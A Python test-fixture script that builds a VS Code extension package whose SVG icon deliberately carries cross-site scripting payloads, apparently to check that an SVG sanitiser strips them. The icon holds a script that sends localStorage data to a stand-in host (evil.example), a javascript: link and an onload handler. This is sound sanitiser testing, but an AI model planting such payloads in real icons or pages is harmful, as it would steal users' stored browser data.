#!/usr/bin/env python3
"""Build a VSIX whose manifest names an SVG icon, with a hostile one inside.

Used by tests/heavy/vsx_view.sh step 6 (RFC 0007-bis §11 q1). The icon carries
the three payloads the sanitiser exists to remove — a `<script>` that would read
the page's storage, an `onload` handler, and a `javascript:` link — plus a
drawing that has to survive them. The `<a>` wraps text rather than the drawing
on purpose: a disallowed element is dropped *with its subtree*, which is the
sanitiser's documented behaviour, so a circle inside the link would go with it
and the test would be asserting the wrong thing.

    make_svg_icon_vsix.py <out.vsix> <publisher.name> <version>
"""

import json
import sys
import zipfile

ICON = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" width="128" height="128">
  <script>fetch('//evil.example/'+localStorage.getItem('x'))</script>
  <a href="javascript:alert(1)">a link a reader cannot inspect</a>
  <rect width="128" height="128" fill="#0b3d91" onload="alert(1)"/>
  <circle cx="64" cy="64" r="40" fill="#ffd166"/>
  <text x="64" y="74" font-size="28" text-anchor="middle" fill="#0b3d91">BH</text>
</svg>"""

VSIX_MANIFEST = """<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
  <Metadata>
    <Identity Language="en-US" Id="{name}" Version="{version}" Publisher="{publisher}" />
    <DisplayName>Heavy SVG Icon</DisplayName>
    <Description>An icon the sanitiser has to vouch for</Description>
  </Metadata>
  <Properties>
    <Property Id="Microsoft.VisualStudio.Code.Engine" Value="^1.85.0" />
  </Properties>
</PackageManifest>"""


def main() -> int:
    path, ext_id, version = sys.argv[1:4]
    publisher, name = ext_id.split(".", 1)

    package_json = json.dumps(
        {
            "publisher": publisher,
            "name": name,
            "version": version,
            "displayName": "Heavy SVG Icon",
            "description": "An icon the sanitiser has to vouch for",
            "icon": "icon.svg",
            "engines": {"vscode": "^1.85.0"},
        }
    )

    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(
            "extension.vsixmanifest",
            VSIX_MANIFEST.format(name=name, version=version, publisher=publisher),
        )
        z.writestr("extension/package.json", package_json)
        z.writestr("extension/icon.svg", ICON)
        z.writestr("extension/README.md", "# Heavy SVG Icon\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
